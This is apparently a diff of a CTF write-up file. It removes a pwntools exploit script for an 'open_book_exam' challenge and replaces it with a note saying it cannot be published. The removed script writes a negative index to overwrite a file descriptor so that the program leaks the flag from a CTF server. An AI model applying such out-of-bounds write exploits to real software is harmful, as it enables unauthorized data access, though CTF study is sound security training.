@@ -57,48 +57,7 @@ con.close()
 ```
 ### open_book_exam writeup
 ```python
-from pwn import *
-
-# c = process("./open_book_exam")
-c = remote("ctf.adl.tw", 10006)
-book_fd  = 0x104010
-question = 0x104050
-cur_book = 0x104060
-
-# idx = (book_fd-question)//4 + 1
-
-# open book
-c.recvuntil(b'> ')
-c.sendline(b'1')
-# open flag
-c.recvuntil(b'> ')
-c.sendline(b'5')
-
-# open book
-c.recvuntil(b'> ')
-c.sendline(b'1')
-# open chinese
-c.recvuntil(b'> ')
-c.sendline(b'1')
-
-fd = 3
-# write book
-c.recvuntil(b'> ')
-c.sendline(b'3')
-# write fd
-c.recvuntil(b'> ')
-c.sendline(b'-15')
-c.recvuntil(b'ans: ')
-c.sendline(str(fd).encode())
-fd+=1
-# read book
-c.recvuntil(b'> ')
-c.sendline(b'2')
-
-print(c.recvlines(3)[2])
-
-# c.interactive()
-c.close()
+# oh no, I can't publish this.
 ```
 <!-- :::info
 it's info
